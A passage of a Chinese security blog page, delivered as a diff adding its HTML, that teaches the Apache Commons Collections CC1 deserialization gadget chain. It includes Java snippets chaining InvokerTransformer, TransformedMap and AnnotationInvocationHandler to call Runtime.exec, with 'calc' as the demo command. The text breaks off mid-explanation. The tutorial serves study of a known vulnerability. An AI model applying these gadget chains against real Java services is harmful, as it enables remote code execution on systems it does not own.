@@ -1,0 +1,987 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="CommonsCollections 全系列详解‍ 前言emmm首先这篇文章是跟着@白日梦组长学的，是在自己有一定的Java审计和Java反序列化的基础上重新回顾(其实我已经看了好几遍了，每次看的感觉都不一样，故自己再次总结一下CC的全系列)，其实归根来说，CC系列其实就是一个链子的排列组合，从我最后的图可以看出，其实就是一个迷宫，完美的诠释了什么叫条条大路通罗马​的含义，这里就对反序列化和一些基">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections 全系列详解">
+<meta property="og:url" content="https://zjackky.github.io/2023/12/11/CommonsCollections%20%E5%85%A8%E7%B3%BB%E5%88%97%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="CommonsCollections 全系列详解‍ 前言emmm首先这篇文章是跟着@白日梦组长学的，是在自己有一定的Java审计和Java反序列化的基础上重新回顾(其实我已经看了好几遍了，每次看的感觉都不一样，故自己再次总结一下CC的全系列)，其实归根来说，CC系列其实就是一个链子的排列组合，从我最后的图可以看出，其实就是一个迷宫，完美的诠释了什么叫条条大路通罗马​的含义，这里就对反序列化和一些基">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208142552-9n427sh.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208142933-xrcdf5i.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208143657-nhrari2.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208143946-yu9xery.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208144106-o3dyqiq.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208145015-pkhjyfz.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208145842-j3m77mm.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208150157-zjjsb4t.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208150245-96isl6d.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208152605-qr062w8.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208153741-oopyw4b.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208154305-t96dr64.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208154416-nldwgsa.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208160432-1577hc9.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208162322-x8welem.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208162414-abgfk9m.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208170746-r6mxyt8.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208170952-53c8u9w.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231208171435-tk6o2js.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209102159-9vmbrm6.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209102655-5l314a7.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209102706-z3g97f1.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209103340-6mcuk32.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209104208-xuwtkzz.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209105315-awq4i67.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209105556-hjetfba.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209111758-8saxpzv.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209121732-mlo56ku.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209122117-blrtzt9.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231209113104-zjachdp.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210103207-b4hkwjf.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210103503-wemf4nc.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210103641-igrjbte.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231130132654-oavldte.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231130105452-10cll7u.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210110613-ank6knr.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210110635-gttb2vc.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231130110651-12995pu.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231130110746-4gdp5ha.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210114017-83r980f.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210114454-2k1wwts.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210114611-o6kid7x.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231210120630-h8k4wdb.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211104406-12z790g.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211104737-lmpytmd.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211104810-yjrfh9l.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211104903-h7qjh11.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211104934-mi54ksd.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211112214-h1ppn9r.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211110610-6hbkbmd.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211110710-bxa3plt.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211121652-pr3huzv.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211121753-4jhdngo.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211144700-vlhuj64.png">
+<meta property="og:image" content="https://zjackky.github.io/assets/image-20231211135100-19md6in.png">
+<meta property="article:published_time" content="2023-12-11T05:30:12.000Z">
+<meta property="article:modified_time" content="2023-12-11T07:41:46.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="Zjacky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjackky.github.io/assets/image-20231208142552-9n427sh.png">
+  
+  
+  
+  <title>CommonsCollections 全系列详解 - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CommonsCollections 全系列详解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-11 13:30" pubdate>
+          2023年12月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CommonsCollections 全系列详解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CommonsCollections-全系列详解"><a href="#CommonsCollections-全系列详解" class="headerlink" title="CommonsCollections 全系列详解"></a>CommonsCollections 全系列详解</h1><p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm首先这篇文章是跟着@<a target="_blank" rel="noopener" href="https://space.bilibili.com/2142877265/video?tid=0&amp;special_type=&amp;pn=1&amp;keyword=">白日梦组长</a>学的，是在自己有一定的Java审计和Java反序列化的基础上重新回顾(其实我已经看了好几遍了，每次看的感觉都不一样，故自己再次总结一下CC的全系列)，其实归根来说，CC系列其实就是一个链子的排列组合，从我最后的图可以看出，其实就是一个迷宫，完美的诠释了什么叫<code>条条大路通罗马</code>​的含义，这里就对反序列化和一些基础知识就不过多赘述，目的就是为了让我忘记CC的时候看我这篇博客可以完全想起来CC到底是怎么个事，文章顺序是跟组长一样的，因为他安排的已经非常到位了</p>
+<p>‍</p>
+<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>CC1有两条 分别是 <code>TransformedMap</code>​  跟<code>LazyMap</code>​</p>
+<p>环境配置如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="TransformedMap​"><a href="#TransformedMap​" class="headerlink" title="TransformedMap​"></a><code>TransformedMap</code>​</h2><p>‍</p>
+<h3 id="​InvokerTransformer​​​"><a href="#​InvokerTransformer​​​" class="headerlink" title="​InvokerTransformer​​​"></a>​<code>InvokerTransformer</code>​​​</h3><p>作者是先从 <code>commons-collections-3.2.1.jar!\org\apache\commons\collections\Transformer</code>​在这里找到了一个接口 <code>Transformer</code>​ 他接受一个Object的传参，并且返回的也是Object，而他的实现类都在<code>\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors</code>​(这是<code>commons-collections</code>​自定义的一组功能类)</p>
+<p>‍</p>
+<p>作者找到了<code>InvokerTransformer</code>​这个实现类中的<code>transform</code>​方法可以任意方法调用的写法</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231208142552-9n427sh.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>如何调用呢？其实也很简单，先弹个计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>invokerTransformer.transform(Runtime.getRuntime());<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231208142933-xrcdf5i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么我们找到了危险函数，我们就往上找谁去能够调用<code>transform</code>​并且是可以传入可控的Object对象的</p>
+<p>‍</p>
+<h3 id="​TransformedMap​​​"><a href="#​TransformedMap​​​" class="headerlink" title="​TransformedMap​​​"></a>​<code>TransformedMap</code>​​​</h3><p>作者就找到了<code>org\apache\commons\collections\map\TransformedMap</code>​类中的<code>checkSetValue</code>​方法是接收<code>Object</code>​对象并且调用了<code>transform</code>​方法，并且是<code>protected</code>​属性</p>
+<p>​<img src="/assets/image-20231208143657-nhrari2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么聪这个函数来看有颜色变换而且现在来看并不知道<code>valueTransformer</code>​是啥，所以我们先去看一下这个函数的构造方法</p>
+<p>​<img src="/assets/image-20231208143946-yu9xery.png" srcset="/img/loading.gif" lazyload alt="image">发现是传入<code>Map map, Transformer keyTransformer, Transformer valueTransformer</code>​ 三个参数，并且把参数给到<code>this.valueTransformer</code>​ 但是这里由于是<code>protected</code>​属性，所以再去找一下是自己在哪里调用了自己</p>
+<p>发现存在一个静态方法<code>decorate</code>​，也是传入三个参数直接传入到构造方法中，那么我们从上面的代码进行修改一下看能否调用</p>
+<p>​<img src="/assets/image-20231208144106-o3dyqiq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//        invokerTransformer.transform(Runtime.getRuntime());</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231208145015-pkhjyfz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h3 id="​AbstractInputCheckedMapDecorator​​​"><a href="#​AbstractInputCheckedMapDecorator​​​" class="headerlink" title="​AbstractInputCheckedMapDecorator​​​"></a>​<code>AbstractInputCheckedMapDecorator</code>​​​</h3><p>发现已经赋值了，那我们就看看如何调用这个<code>protected</code>​属性的<code>checkSetValue</code>​</p>
+<p>于是作者找到了 <code>commons-collections-3.2.1-sources.jar!\org\apache\commons\collections\map\AbstractInputCheckedMapDecorator.java#setValue </code>​</p>
+<p>​<img src="/assets/image-20231208145842-j3m77mm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这里要搞清楚这个类的逻辑，</p>
+<p>​<code>AbstractInputCheckedMapDecorator</code>​ 这个类其实是<code>TransformedMap</code>​的父类</p>
+<p>​<img src="/assets/image-20231208150157-zjjsb4t.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>并且这个<code>setValue</code>​方法是在一个静态类<code>MapEntry</code>​里头的</p>
+<p>​<img src="/assets/image-20231208150245-96isl6d.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>搞清楚逻辑后，其实这个<code>MapEntry</code>​ 就是遍历Map的键值对的一个静态类，在以下代码中就会触发他的方法(其实就是重写了<code>Map#setvalue</code>​方法)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>    entry.setValue(<span class="hljs-string">&quot;aaa&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>那其实就可以得到，只要去对这个键值对进行<code>setValue</code>​方法即可触发</p>
+<p>​<img src="/assets/image-20231208152605-qr062w8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以现在只要把我们的Runtime对象传入到value值即可触发任意方法调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>);<br>Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br><span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>    entry.setValue(r);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231208153741-oopyw4b.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么我们后半条链子就连起来了，接下来就是去找哪个地方是存在<code>Entry</code>​的遍历的，并且可以把对象传入的点</p>
+<h3 id="​AnnotationInvocationHandler​​​"><a href="#​AnnotationInvocationHandler​​​" class="headerlink" title="​AnnotationInvocationHandler​​​"></a>​<code>AnnotationInvocationHandler</code>​​​</h3><p>作者就找到了<code>jdk1.8.0_65\src\sun\reflect\annotation\AnnotationInvocationHandler.java</code>​ 中的 <code>readObject</code>​ 方法是调用了<code>setValue</code>​ ，那么其实已经找到<code>readObject</code>​就非常好可以进行串联了</p>
+<p>​<img src="/assets/image-20231208154305-t96dr64.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那我们来看一下他的构造方法</p>
+<p>​<img src="/assets/image-20231208154416-nldwgsa.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>也很简单，就是传一个注解和一个Map类，又因为他不是public类，所以必须得用反射去实例化他，那么就其实挺简单，就反射区实例化他即可，然后把我们设计好的<code>Entry</code>​传给他即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cl</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cl.setAccessible(<span class="hljs-literal">true</span>);<br>cl.newInstance(Override.class,transformedMap);<br></code></pre></td></tr></table></figure>
+
+<p>但是这里仍然存在几个问题</p>
+<ul>
+<li>​<code>Runtime</code>​对象是不可以序列化的，需要用反射进行序列化</li>
+<li>​<code>setValue</code>​方法的参数貌似不可控</li>
+<li>有两个if判断需要进去</li>
+</ul>
+<p>‍</p>
+<p>先解决第一个问题 如何让<code>Runtime</code>​对象可以序列化</p>
+<p>‍</p>
+<p>因为Class类是可以反序列化的，所以只要让<code>Runtime</code>​为Class类并且调用其方法即可</p>
+<p>​<img src="/assets/image-20231208160432-1577hc9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>他是存在<code>getRuntime</code>​的静态方法的，所以可以直接调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> r.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Runtime) m.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>); <span class="hljs-comment">// 注意这里是getRuntime()的无参构造</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> r.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>m1.invoke(o,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>那第一个问题就解决了，那么接下来就是通过<code>InvokerTransformer</code>​的反射来吧这个反射重写一遍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span>  <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(r);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(m);<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(o);<br></code></pre></td></tr></table></figure>
+
+<p>这样就写好了，但是可以发现这里是前一个接收的对象作为后一个transform方法的输入</p>
+<p>‍</p>
+<p>所以作者又找到了一个类 <code>ChainedTransformer</code>​</p>
+<p>构造方法就是传一个<code>Transformer</code>​类的数组</p>
+<p>​<img src="/assets/image-20231208162322-x8welem.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后这个类的<code>transform</code>​方法就会进行一个链式调用</p>
+<p>​<img src="/assets/image-20231208162414-abgfk9m.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>那么我可以定义一个<code>Transformer</code>​的数组然后将<code>InvokerTransformer</code>​的发射链式调用写进去然后去触发其<code>transform</code>​方法即可</p>
